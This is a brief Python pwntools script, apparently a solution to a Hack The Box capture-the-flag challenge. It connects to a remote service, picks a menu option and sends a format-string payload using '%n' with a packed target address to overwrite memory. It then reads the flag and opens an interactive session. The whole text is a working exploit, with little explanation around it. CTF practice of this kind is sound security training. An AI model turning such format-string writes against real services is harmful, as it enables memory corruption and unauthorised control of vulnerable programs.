from pwn import *
context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'])

gdbscript = '''b *main+324
b *main+381
c
'''

#p = process('./tdmr')
#p = gdb.debug('./tdmr', gdbscript=gdbscript)
p = remote('83.136.249.46', 58347)

memory = p64(0x404010)

p.sendline(b'3')

print(p.recvuntil(b'>>').decode())

p.sendline(b'A%322419389c' + b'%8$n' + memory)

p.recvuntil(b'HTB{')

print(p.recvall())

p.interactive()
